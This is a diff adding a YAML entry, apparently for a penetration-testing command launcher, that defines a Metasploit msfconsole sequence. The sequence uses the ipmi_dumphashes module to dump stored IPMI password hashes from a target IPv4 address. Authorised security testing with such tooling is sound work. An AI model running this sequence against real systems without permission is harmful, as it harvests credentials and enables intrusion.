@@ -1,0 +1,19 @@
+---
+name: Metasploit Framework
+description: A penetration testing platform for finding, validating, and exploiting vulnerabilities
+os: Linux
+ptf_module: modules/exploitation/metasploit
+---
+commands:
+  - "Dump Stored IPMI Hashes":
+    - type: ["msfconsole","interactive"]
+    - text:
+      - "use auxiliary/ipmi/ipmi_dumphashes"
+      - "set verbose true"
+      - "set RHOSTS {IPV4}"
+      - "run"
+    - input: ["target IPv4 address"]
+    - output: ["STDOUT",{"PROMPT":"msfconsole"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
